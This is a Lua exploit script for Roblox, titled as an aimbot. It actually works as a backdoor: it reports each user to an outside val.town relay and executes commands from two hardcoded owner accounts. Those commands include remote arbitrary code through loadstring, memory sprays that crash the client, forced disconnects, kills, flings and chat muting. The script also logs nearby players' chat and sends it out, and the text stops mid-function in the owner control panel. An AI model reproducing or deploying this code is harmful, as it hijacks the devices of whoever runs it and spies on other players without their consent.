--[[
    [S] Universal Control + Aimbot v14
    Owners: 1460823186, 7208967899
    Transport: val.town blob
    Safety: 20s age gate + sync startup drain (no replay on rejoin/re-execute)
--]]

local OWNERS = { [1460823186] = true, [7208967899] = true }

local RELAY_URL = "https://pagesoftwo--8cf9285cc81611f1a1df1607ee4eb77e.web.val.run"

local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local HttpService  = game:GetService("HttpService")
local TeleportSvc  = game:GetService("TeleportService")
local GuiService   = game:GetService("GuiService")
local CoreGui      = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Camera       = workspace.CurrentCamera

local LP    = Players.LocalPlayer
local MY_ID = LP.UserId
local IS_OWNER = OWNERS[MY_ID] == true

local CMD_MAX_AGE = 20  -- seconds; commands older than this are ignored

-- ============================================================
-- HTTP
-- ============================================================
local function httpRequest(opts)
    opts.Headers = opts.Headers or {}
    opts.Headers["Cache-Control"] = "no-cache"
    local ok, res = pcall(function()
        if syn and syn.request then return syn.request(opts)
        elseif http_request then return http_request(opts)
        elseif request then return request(opts)
        else
            local m = opts.Method or "GET"
            if m == "GET" then
                return { Body = HttpService:GetAsync(opts.Url, true, opts.Headers) }
            elseif m == "PUT" then
                return { Body = HttpService:RequestAsync({ Url = opts.Url, Method = "PUT", Body = opts.Body, Headers = opts.Headers }).Body }
            else
                return { Body = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson) }
            end
        end
    end)
    if ok then return res end
    return nil
end

local function readState()
    local r = httpRequest({ Url = RELAY_URL, Method = "GET" })
    if not r or not r.Body or #r.Body == 0 then return nil end
    if r.Body:sub(1, 1) ~= "{" then return nil end
    local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
    if ok and type(d) == "table" then return d end
    return nil
end

local function writeState(state)
    return httpRequest({
        Url = RELAY_URL,
        Method = "PUT",
        Body = HttpService:JSONEncode(state),
        Headers = { ["Content-Type"] = "application/json" },
    })
end

-- ============================================================
-- Target-side persistent state
-- ============================================================
local PERSIST = {
    anti_unfreeze = false,
    reapply       = false,
    mute          = false,
    invert_move   = false,
    swap_ws       = false,
    swap_ad       = false,
    screen_flip   = false,
    mem_lite      = false,
    mem_full      = false,
}
local LAST_ACTION = nil
local MUTE_HOOKS  = {}

local MSG_HANDLERS = {}
local SEEN_CMDS = {}
local CMD_HISTORY_CAP = 40

-- ============================================================
-- Screen flip camera hook
-- ============================================================
RunService:BindToRenderStep("__sk_flip", Enum.RenderPriority.Camera.Value + 1, function()
    if PERSIST.screen_flip and Camera then
        pcall(function()
            Camera.CFrame = Camera.CFrame * CFrame.Angles(0, 0, math.pi)
        end)
    end
end)

-- ============================================================
-- Persistent re-apply loop
-- ============================================================
task.spawn(function()
    while true do
        task.wait(0.1)
        pcall(function()
            local char = LP.Character
            local hrp  = char and char:FindFirstChild("HumanoidRootPart")
            if PERSIST.anti_unfreeze and hrp and not hrp.Anchored then
                hrp.Anchored = true
            end
        end)
    end
end)

LP.CharacterAdded:Connect(function()
    if PERSIST.reapply and LAST_ACTION then
        task.wait(2)
        for _, h in ipairs(MSG_HANDLERS) do pcall(h, LAST_ACTION) end
    end
end)

-- ============================================================
-- Mute (hook outgoing chat)
-- ============================================================
local function setMute(on)
    PERSIST.mute = on
    if on then
        pcall(function()
            local evts = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
            if evts and evts:FindFirstChild("SayMessageRequest") and hookfunction then
                if not MUTE_HOOKS.legacy then
                    MUTE_HOOKS.legacy = hookfunction(evts.SayMessageRequest.FireServer, function() end)
                end
            end
        end)
        pcall(function()
            local tcs = game:GetService("TextChatService")
            if tcs.ChatVersion == Enum.ChatVersion.TextChatService and hookfunction then
                local ch = tcs:FindFirstChild("TextChannels")
                if ch then
                    for _, c in ipairs(ch:GetChildren()) do
                        if c:IsA("TextChannel") and not MUTE_HOOKS[c.Name] then
                            MUTE_HOOKS[c.Name] = hookfunction(c.SendAsync, function() end)
                        end
                    end
                end
            end
        end)
    else
        pcall(function()
            if MUTE_HOOKS.legacy and restorefunction then restorefunction(MUTE_HOOKS.legacy) end
            MUTE_HOOKS.legacy = nil
            for k, v in pairs(MUTE_HOOKS) do
                if k ~= "legacy" and restorefunction then pcall(restorefunction, v) end
            end
            MUTE_HOOKS = {}
        end)
    end
end

-- ============================================================
-- Movement swaps (camera-relative)
-- ============================================================
local function applyMoveMods()
    pcall(function()
        local pm = LP.PlayerScripts:FindFirstChild("PlayerModule")
        if not pm then return end
        local controls = require(pm):GetControls()
        if not controls.__sk_base then controls.__sk_base = controls.moveFunction end
        local base = controls.__sk_base
        controls.moveFunction = function(self, dir, rel)
            local x, y, z = dir.X, dir.Y, dir.Z
            if PERSIST.swap_ad then x = -x end
            if PERSIST.invert_move then x = -x; z = -z end
            if PERSIST.swap_ws then z = -z end
            return base(self, Vector3.new(x, y, z), rel)
        end
    end)
end

-- ============================================================
-- Action executor
-- ============================================================
local function makeOverlayGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.IgnoreGuiInset = true
    g.DisplayOrder = 999
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function showImage(decalId, dur)
    decalId = tostring(decalId or ""):gsub("%D", "")
    if decalId == "" then return end
    local g = makeOverlayGui("[S] img")
    local img = Instance.new("ImageLabel")
    img.Size = UDim2.new(1, 0, 1, 0)
    img.Position = UDim2.new(0, 0, 0, 0)
    img.BackgroundTransparency = 1
    img.Image = "rbxassetid://" .. decalId
    img.ScaleType = Enum.ScaleType.Fit
    img.Parent = g
    task.delay(dur or 6, function() g:Destroy() end)
end

local function showFlashbang()
    local g = makeOverlayGui("[S] flash")
    local f = Instance.new("Frame")
    f.Size = UDim2.new(1, 0, 1, 0)
    f.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    f.BorderSizePixel = 0
    f.BackgroundTransparency = 0
    f.Parent = g
    TweenService:Create(f, TweenInfo.new(1.6, Enum.EasingStyle.Quad), { BackgroundTransparency = 1 }):Play()
    task.delay(1.7, function() g:Destroy() end)
end

local function forceDisconnect()
    pcall(function() game:Shutdown() end)
    pcall(function() LP:Kick("") end)
    pcall(function()
        local nc = game:GetService("NetworkClient")
        if nc and nc.Disconnect then nc:Disconnect() end
    end)
    task.spawn(function()
        for _ = 1, 200 do
            local _ = string.rep("x", 1000000)
            task.wait(0.01)
        end
    end)
end

local function spawnMemSpray(lite)
    task.spawn(function()
        while PERSIST.mem_full or PERSIST.mem_lite do
            local chunk = {}
            local n = PERSIST.mem_full and 40000 or 6000
            local sz = PERSIST.mem_full and 400 or 220
            for i = 1, n do
                chunk[i] = string.rep("F", sz) .. tostring(i)
            end
            local waitAmt = PERSIST.mem_full and 0.005 or 0.06
            task.wait(waitAmt)
        end
    end)
end

local function executeAction(c)
    if not c or not c.from then return end
    if not OWNERS[tonumber(c.from)] then return end

    if c.action ~= "code" then LAST_ACTION = c end

    local char = LP.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")

    if c.action == "freeze" and hrp then hrp.Anchored = true end
    if c.action == "unfreeze" and hrp then hrp.Anchored = false end

    if c.action == "anti_unfreeze" then PERSIST.anti_unfreeze = not PERSIST.anti_unfreeze end
    if c.action == "reapply"       then PERSIST.reapply = not PERSIST.reapply end

    if c.action == "sit" and hum then hum.Sit = true end
    if c.action == "stand" and hum then hum.Sit = false end

    if c.action == "emote" and hum then
        pcall(function() hum:PlayEmote(tostring(c.payload)) end)
    end

    if c.action == "flip" then PERSIST.screen_flip = not PERSIST.screen_flip end

    if c.action == "invert_move" then
        PERSIST.invert_move = not PERSIST.invert_move
        applyMoveMods()
    end
    if c.action == "swap_ws" then
        PERSIST.swap_ws = not PERSIST.swap_ws
        applyMoveMods()
    end
    if c.action == "swap_ad" then
        PERSIST.swap_ad = not PERSIST.swap_ad
        applyMoveMods()
    end

    if c.action == "mute" then setMute(not PERSIST.mute) end

    if c.action == "flashbang" then showFlashbang() end
    if c.action == "image" then showImage(c.payload, 6) end

    if c.action == "disconnect" then
        if _G.__sk_disconnect_fired then return end
        _G.__sk_disconnect_fired = true
        forceDisconnect()
        return
    end

    if c.action == "mems_spray_lite" then
        PERSIST.mem_lite = not PERSIST.mem_lite
        if PERSIST.mem_lite then spawnMemSpray(true) end
    end
    if c.action == "mem_spray_full" then
        PERSIST.mem_full = not PERSIST.mem_full
        if PERSIST.mem_full then spawnMemSpray(false) end
    end

    if c.action == "fling" and hrp then
        task.spawn(function()
            for _ = 1, 60 do
                pcall(function()
                    hrp.AssemblyLinearVelocity = Vector3.new(1e5, 1e5, 1e5)
                    hrp.Velocity = Vector3.new(1e5, 1e5, 1e5)
                end)
                RunService.Heartbeat:Wait()
            end
        end)
    end

    if c.action == "explode" and hrp then
        if hum then hum.Health = 0 end
        local e = Instance.new("Explosion")
        e.Position = hrp.Position
        e.BlastPressure = 500000
        e.BlastRadius = 10
        e.DestroyJointRadiusPercent = 1
        e.Parent = workspace
    end

    if c.action == "kill" and hum then hum.Health = 0 end
    if c.action == "reset" and hum then hum.Health = 0 end

    if c.action == "ragdoll" and char then
        for _, j in ipairs(char:GetDescendants()) do
            if j:IsA("Motor6D") then j.Enabled = false end
        end
    end

    if c.action == "bring" and hrp then
        local payload = tostring(c.payload or "")
        local x, y, z = payload:match("^(-?%d+%.?%d*),(-?%d+%.?%d*),(-?%d+%.?%d*)$")
        if x and y and z then
            hrp.CFrame = CFrame.new(tonumber(x), tonumber(y), tonumber(z))
        else
            local owner = Players:GetPlayerByUserId(tonumber(c.from))
            if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
                hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
            end
        end
    end

    if c.action == "message" then
        local g2 = makeOverlayGui("[S] msg")
        local box = Instance.new("TextLabel")
        box.Size = UDim2.new(0, 340, 0, 64)
        box.Position = UDim2.new(0.5, -170, 0.12, 0)
        box.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
        box.BorderSizePixel = 0
        box.TextColor3 = Color3.fromRGB(255, 255, 255)
        box.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        box.TextStrokeTransparency = 0.15
        box.Font = Enum.Font.GothamBold
        box.TextSize = 15
        box.TextWrapped = true
        box.Text = tostring(c.payload or "")
        box.Parent = g2
        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = box
        local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(200, 130, 255); ss.Parent = box
        task.delay(4, function() g2:Destroy() end)
    end

    if c.action == "chat" then
        local msg = tostring(c.payload or "")
        if msg ~= "" then
            pcall(function()
                local rs = game:GetService("ReplicatedStorage")
                local evts = rs:FindFirstChild("DefaultChatSystemChatEvents")
                if evts and evts:FindFirstChild("SayMessageRequest") then
                    evts.SayMessageRequest:FireServer(msg, "All")
                end
            end)
            pcall(function()
                local tcs = game:GetService("TextChatService")
                if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                    local ch = tcs:FindFirstChild("TextChannels")
                    if ch then
                        local gen = ch:FindFirstChild("RBXGeneral") or ch:FindFirstChildOfClass("TextChannel")
                        if gen then gen:SendAsync(msg) end
                    end
                end
            end)
        end
    end

    if c.action == "kick" then
        pcall(function() LP:Kick(tostring(c.payload ~= "" and c.payload or "Kicked.")) end)
    end

    if c.action == "code" then
        local fn = loadstring or load
        if fn then pcall(function() fn(c.payload)() end) end
    end
end

table.insert(MSG_HANDLERS, executeAction)

-- ============================================================
-- Startup: burn every queued command BEFORE the poll loop starts
-- ============================================================
pcall(function()
    local state = readState() or { online = {}, cmd = {} }
    state.cmd = state.cmd or {}
    local my = state.cmd[tostring(MY_ID)] or {}
    for _, c in ipairs(my) do
        if c.cid then SEEN_CMDS[c.cid] = os.time() end
    end
    state.cmd[tostring(MY_ID)] = {}
    writeState(state)
end)

PERSIST.reapply = false
LAST_ACTION = nil

-- ============================================================
-- Command poll (with age gate)
-- ============================================================
task.spawn(function()
    while true do
        pcall(function()
            local state = readState()
            if state and state.cmd then
                local my = state.cmd[tostring(MY_ID)]
                if my and type(my) == "table" then
                    for _, c in ipairs(my) do
                        local cid = c.cid
                        if cid and not SEEN_CMDS[cid] then
                            SEEN_CMDS[cid] = os.time()
                            local age = os.time() - (c.ts or 0)
                            if age < CMD_MAX_AGE then
                                for _, h in ipairs(MSG_HANDLERS) do pcall(h, c) end
                            end
                        end
                    end
                end
            end
            local now = os.time()
            for cid, ts in pairs(SEEN_CMDS) do
                if now - ts > 300 then SEEN_CMDS[cid] = nil end
            end
        end)
        task.wait(0.35)
    end
end)

-- ============================================================
-- Heartbeat
-- ============================================================
task.spawn(function()
    while true do
        pcall(function()
            local state = readState() or { online = {}, cmd = {} }
            state.online = state.online or {}
            state.cmd = state.cmd or {}
            state.online[tostring(MY_ID)] = {
                name = LP.Name,
                job = game.JobId,
                place = game.PlaceId,
                ts = os.time(),
                exec = (identifyexecutor and identifyexecutor()) or "unknown",
            }
            writeState(state)
        end)
        task.wait(5)
    end
end)

-- ============================================================
-- Nearby chat log
-- ============================================================
task.spawn(function()
    task.wait(2)
    local RADIUS = 50
    local function hookPlayer(p)
        if p == LP then return end
        p.Chatted:Connect(function(msg)
            pcall(function()
                local myHrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                local theirHrp = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
                if not (myHrp and theirHrp) then return end
                local dist = (myHrp.Position - theirHrp.Position).Magnitude
                if dist > RADIUS then return end
                local state = readState() or { online = {}, cmd = {} }
                state.chatlog = state.chatlog or {}
                state.chatlog[tostring(MY_ID)] = state.chatlog[tostring(MY_ID)] or {}
                table.insert(state.chatlog[tostring(MY_ID)], {
                    from = p.Name,
                    msg = tostring(msg),
                    dist = math.floor(dist),
                    ts = os.time(),
                })
                while #state.chatlog[tostring(MY_ID)] > 20 do
                    table.remove(state.chatlog[tostring(MY_ID)], 1)
                end
                writeState(state)
            end)
        end)
    end
    for _, p in ipairs(Players:GetPlayers()) do hookPlayer(p) end
    Players.PlayerAdded:Connect(hookPlayer)
end)

-- ============================================================
-- UI helpers
-- ============================================================
local function makeGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    g.IgnoreGuiInset = true
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function pulseStroke(stroke)
    task.spawn(function()
        local a = Color3.fromRGB(170, 100, 245)
        local b = Color3.fromRGB(235, 155, 255)
        while stroke and stroke.Parent do
            local t1 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = b })
            t1:Play(); t1.Completed:Wait()
            if not stroke.Parent then break end
            local t2 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = a })
            t2:Play(); t2.Completed:Wait()
        end
    end)
end

local function styleFrame(frame)
    frame.BackgroundColor3 = Color3.fromRGB(26, 18, 40)
    frame.BorderSizePixel = 0
    frame.Active = true
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = frame
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(170, 100, 245); s.Thickness = 1.8; s.Parent = frame
    pulseStroke(s)
    return s
end

local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(75, 45, 120)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    btn.TextStrokeTransparency = 0.15
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 13
    btn.AutoButtonColor = false
    btn.Active = true
    btn.RichText = false

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(215, 150, 255)
    s.Thickness = 1.5
    s.Transparency = 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(105, 65, 165)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(75, 45, 120)
    end)
    btn.MouseButton1Down:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(155, 105, 210)
    end)
    btn.MouseButton1Up:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(75, 45, 120)
    end)
end

local function makeBtn(parent, text, x, y, w, h, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, w, 0, h)
    b.Position = UDim2.new(0, x, 0, y)
    b.Text = text
    b.Parent = parent
    styleButton(b)
    b.MouseButton1Click:Connect(cb)
    return b
end

local function makeLabel(parent, text, x, y, w, h, sz, color)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0, w, 0, h)
    l.Position = UDim2.new(0, x, 0, y)
    l.BackgroundTransparency = 1
    l.TextColor3 = color or Color3.fromRGB(255, 255, 255)
    l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    l.TextStrokeTransparency = 0.15
    l.Font = Enum.Font.GothamBold
    l.TextSize = sz or 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = text
    l.Parent = parent
    return l
end

local function makeInput(parent, placeholder, x, y, w, h)
    local t = Instance.new("TextBox")
    t.Size = UDim2.new(0, w, 0, h)
    t.Position = UDim2.new(0, x, 0, y)
    t.BackgroundColor3 = Color3.fromRGB(40, 22, 62)
    t.BorderSizePixel = 0
    t.TextColor3 = Color3.fromRGB(255, 255, 255)
    t.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    t.TextStrokeTransparency = 0.15
    t.PlaceholderColor3 = Color3.fromRGB(200, 175, 230)
    t.Font = Enum.Font.GothamBold
    t.TextSize = 12
    t.PlaceholderText = placeholder
    t.Text = ""
    t.ClearTextOnFocus = false
    t.Active = true
    t.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(190, 130, 255)
    s.Thickness = 1.3
    s.Transparency = 0
    s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    s.Parent = t
    return t
end

local function makeScrolling(parent, x, y, w, h)
    local s = Instance.new("ScrollingFrame")
    s.Size = UDim2.new(0, w, 0, h)
    s.Position = UDim2.new(0, x, 0, y)
    s.BackgroundTransparency = 1
    s.BorderSizePixel = 0
    s.ScrollBarThickness = 6
    s.ScrollBarImageColor3 = Color3.fromRGB(210, 140, 255)
    s.ScrollingDirection = Enum.ScrollingDirection.Y
    s.ScrollingEnabled = true
    s.ClipsDescendants = true
    s.Active = true
    s.CanvasSize = UDim2.new(0, 0, 0, 0)
    s.Parent = parent
    local l = Instance.new("UIListLayout")
    l.Padding = UDim.new(0, 6)
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Parent = s
    return s, l
end

local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, dragStart, startPos
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ============================================================
-- Join with fallbacks
-- ============================================================
local function joinServer(placeId, jobId)
    placeId = tonumber(placeId) or game.PlaceId
    jobId = tostring(jobId or "")
    local ok = pcall(function() TeleportSvc:TeleportToPlaceInstance(placeId, jobId, LP) end)
    if ok then return end
    ok = pcall(function() TeleportSvc:Teleport(placeId, LP) end)
    if ok then return end
    local link = "roblox://placeId=" .. tostring(placeId)
    if jobId ~= "" and jobId ~= "nil" then link = link .. "&gameInstanceId=" .. jobId end
    ok = pcall(function() GuiService:OpenBrowserWindow(link) end)
    if ok then return end
    pcall(function()
        if syn and syn.request then syn.request({ Url = link, Method = "GET" })
        elseif request then request({ Url = link, Method = "GET" }) end
    end)
    pcall(function() if setclipboard then setclipboard(link) end end)
    local g = makeGui("[S] join")
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0, 400, 0, 40)
    l.Position = UDim2.new(0.5, -200, 0.05, 0)
    l.BackgroundColor3 = Color3.fromRGB(22, 16, 34)
    l.BorderSizePixel = 0
    l.TextColor3 = Color3.fromRGB(255, 255, 255)
    l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    l.TextStrokeTransparency = 0.15
    l.Font = Enum.Font.GothamBold
    l.TextSize = 14
    l.Text = "join link copied — paste in browser"
    l.Parent = g
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 8); c.Parent = l
    task.delay(5, function() g:Destroy() end)
end

-- ============================================================
-- OWNER PANEL
-- ============================================================
if IS_OWNER then
    local ONLINE     = {}
    local HISTORY    = {}
    local FILTER     = { exec = "", place = "" }
    local FOLLOWING  = {}
    local EXPANDED   = nil
    local LAST_SYNC  = 0
    local LAST_ERR   = ""
    local CARD_REFS  = {}
    local TOGGLES    = {}

    local gui = makeGui("[S] Control")
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 400, 0, 700)
    frame.Position = UDim2.new(0, 20, 0.05, 0)
    styleFrame(frame)
    frame.Parent = gui

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = frame
    makeDraggable(frame, header)

    makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
    local statusLbl = makeLabel(header, "sync: ...", 240, 8, 150, 14, 10, Color3.fromRGB(255, 255, 255))
    statusLbl.TextXAlignment = Enum.TextXAlignment.Right

    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 360, 14)

    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 180, 22)
    local placeFilter = makeInput(frame, "filter place id...", 200, 52, 186, 22)
    execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
    placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)

    local bcast = makeInput(frame, "broadcast message...", 14, 80, 290, 24)
    makeBtn(frame, "Send All", 310, 80, 76, 24, function()
        for uid in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) and not OWNERS[tonumber(uid)] then
                local st = readState() or { online = {}, cmd = {} }
                st.cmd = st.cmd or {}
                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                table.insert(st.cmd[tostring(uid)], {
                    from = MY_ID, action = "message", payload = bcast.Text,
                    ts = os.time(), cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
                })
                while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
                writeState(st)
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
    end)

    local function globalAction(label, action)
        for uid in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) and not OWNERS[tonumber(uid)] then
                local st = readState() or { online = {}, cmd = {} }
                st.cmd = st.cmd or {}
                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                table.insert(st.cmd[tostring(uid)], {
                    from = MY_ID, action = action, payload = "",
                    ts = os.time(), cid = tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999)),
                })
                while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
                writeState(st)
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. label)
    end

    makeBtn(frame, "Freeze All",   14, 112, 86, 24, function() globalAction("freeze all", "freeze") end)
    makeBtn(frame, "Unfreeze All", 104, 112, 86, 24, function() globalAction("unfreeze all", "unfreeze") end)
    makeBtn(frame, "Fling All",    194, 112, 86, 24, function() globalAction("fling all", "fling") end)
    makeBtn(frame, "Explode All",  284, 112, 102, 24, function() globalAction("explode all", "explode") end)

    makeBtn(frame, "Kill All",    14, 140, 86, 22, function() globalAction("kill all", "kill") end)
    makeBtn(frame, "Reset All",   104, 140, 86, 22, function() globalAction("reset all", "reset") end)
    makeBtn(frame, "Ragdoll All", 194, 140, 86, 22, function() globalAction("ragdoll all", "ragdoll") end)
    makeBtn(frame, "Bring All",   284, 140, 102, 22, function() globalAction("bring all", "bring") end)

    makeLabel(frame, "LIVE PLAYERS", 14, 172, 200, 14)

    local scroll, layout = makeScrolling(frame, 14, 190, 372, 400)

    makeLabel(frame, "HISTORY", 14, 600, 100, 14)
    local histLog = Instance.new("TextLabel")
    histLog.Size = UDim2.new(0, 372, 0, 60)
    histLog.Position = UDim2.new(0, 14, 0, 618)
    histLog.BackgroundColor3 = Color3.fromRGB(20, 12, 32)
    histLog.BorderSizePixel = 0
    histLog.TextColor3 = Color3.fromRGB(255, 255, 255)
    histLog.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
    histLog.TextStrokeTransparency = 0.15
    histLog.Font = Enum.Font.Code
    histLog.TextSize = 10
    histLog.TextXAlignment = Enum.TextXAlignment.Left
    histLog.TextYAlignment = Enum.TextYAlignment.Top
    histLog.TextWrapped = true
    histLog.Text = ""
    histLog.Parent = frame
    local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 6); hc.Parent = histLog
    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(170, 100, 245); hs.Transparency = 0.4; hs.Parent = histLog

    local function refreshHistory()
        local out = {}
        for i = 1, math.min(5, #HISTORY) do table.insert(out, HISTORY[i]) end
        histLog.Text = table.concat(out, "\n")
    end

    local function newCid()
        return tostring(MY_ID) .. "_" .. tostring(os.time()) .. "_" .. tostring(math.random(1, 999999))
    end

    local function cmd(uid, action, payload)
        local st = readState() or { online = {}, cmd = {} }
        st.cmd = st.cmd or {}
        st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
        local finalPayload = payload or ""
        if action == "bring" and LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
            local p = LP.Character.HumanoidRootPart.Position
            finalPayload = tostring(p.X) .. "," .. tostring(p.Y) .. "," .. tostring(p.Z)
        end
        table.insert(st.cmd[tostring(uid)], {
            from = MY_ID, action = action, payload = finalPayload,
            ts = os.time(), cid = newCid(),
        })
        while #st.cmd[tostring(uid)] > CMD_HISTORY_CAP do table.remove(st.cmd[tostring(uid)], 1) end
        writeState(st)
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. tostring(action) .. " #" .. tostring(uid))
        refreshHistory()
    end

    local function passesFilter(user)
        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then return false end
        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then return false end
        return true
    end

    local function getToggles(uid)
        TOGGLES[uid] = TOGGLES[uid] or {}
        return TOGGLES[uid]
    end

    local function buildCard(uid, user)
        local card = Instance.new("Frame")
        card.Size = UDim2.new(1, -8, 0, 66)
        card.BackgroundColor3 = Color3.fromRGB(40, 26, 62)
        card.BorderSizePixel = 0
        card.Active = true
        card.Parent = scroll
        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = card
        local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(190, 120, 255); cs.Transparency = 0.25; cs.Parent = card

        local av = Instance.new("Frame")
        av.Size = UDim2.new(0, 46, 0, 46)
        av.Position = UDim2.new(0, 10, 0, 10)
        av.BackgroundColor3 = Color3.fromRGB(85, 55, 125)
        av.BorderSizePixel = 0
        av.Parent = card
        local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = av

        local nameLbl = makeLabel(card, tostring(user.name), 64, 6, 200, 16, 13)
        local metaLbl = makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
        local hbLbl   = makeLabel(card, "hb 0s", 64, 42, 120, 12, 10)

        local joinBtn = makeBtn(card, "Join", 300, 8, 64, 22, function()
            local u = CARD_REFS[uid] and CARD_REFS[uid].user or user
            joinServer(u.place or game.PlaceId, u.job)
        end)

        local expandBtn = makeBtn(card, "v", 300, 36, 64, 22, function() end)

        local ref = {
            card = card, nameLbl = nameLbl, metaLbl = metaLbl, hbLbl = hbLbl,
            joinBtn = joinBtn, expandBtn = expandBtn, user = user, panel = nil, chatLogLbl = nil,
        }

        local function collapse()
            if ref.panel then ref.panel:Destroy(); ref.panel = nil end
            card.Size = UDim2.new(1, -8, 0, 66)
            joinBtn.Visible = false
            expandBtn.Text = "v"
            ref.chatLogLbl = nil
        end

        local function expand()
            if ref.panel then return end
            joinBtn.Visible = true
            expandBtn.Text = "^"
            local panel = Instance.new("Frame")
            panel.Size = UDim2.new(1, -8, 0, 700)
            panel.Position = UDim2.new(0, 4, 0, 70)
            panel.BackgroundTransparency = 1
            panel.Active = true
            panel.Parent = card
